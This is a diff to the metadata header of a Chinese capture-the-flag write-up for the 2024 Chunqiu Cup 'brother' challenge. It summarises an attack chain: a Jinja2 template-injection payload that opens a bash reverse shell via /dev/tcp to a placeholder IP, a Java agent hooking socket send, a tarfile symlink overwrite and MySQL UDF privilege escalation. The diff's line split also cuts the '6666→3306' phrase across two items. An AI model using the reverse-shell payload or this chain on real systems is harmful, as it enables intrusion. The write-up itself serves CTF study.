@@ -12,7 +12,9 @@ tags:
 - evil.key-read
 - MySQL-UDF-privesc
 - tarfile-symlink-overwrite
-attack_chain: 1. SSTI Jinja2 {{lipsum.__globals__['os'].popen('bash -i >& /dev/tcp/IP/6666')}} 反弹 shell/2. sql-proxy.jar 6666→3306 流量转发 + Java agent 劫持 socket send 方法读 /app/evil.key/3. update.py code=1 接收 tar.gz 解压 new.bin 到 /updatedir/4. tarfile 软链接覆盖写入 MySQL 插件目录 + UDF 提权
+attack_chain:
+- '1. SSTI Jinja2 {{lipsum.__globals__[''os''].popen(''bash -i >& /dev/tcp/IP/6666'')}} 反弹 shell/2. sql-proxy.jar 6666'
+- '3306 流量转发 + Java agent 劫持 socket send 方法读 /app/evil.key/3. update.py code=1 接收 tar.gz 解压 new.bin 到 /updatedir/4. tarfile 软链接覆盖写入 MySQL 插件目录 + UDF 提权'
 key_payload: 'SQL proxy: sourcePort=6666 destPort=3306  UDF so: /app/evil.key  tarfile 软链接覆盖'
 one_liner: 2024 春秋杯夏季赛 brother 出题思路，SSTI 反弹 shell + sql-proxy.jar Java agent hook send + MySQL UDF 提权。
 lesson: sql-proxy.jar 用 Base64ClassLoader 动态加载类，Java agent 可劫持 socket send 改响应；tarfile 解压未限制软链接是覆盖写入漏洞；MySQL UDF 提权需要 plugin_dir 写入权限。
@@ -59,6 +61,9 @@ prerequisites:
 - Java agent + Instrumentation API
 - tarfile 软链接覆盖漏洞（CVE-2007-4559）
 - MySQL UDF 提权流程
+contest_normalized: "春秋杯"
+contest_year: 2024
+subcategory_guess: "ssti"
 ---
 # 【WP】2024年春秋杯夏季赛“brother”出题思路详解
 
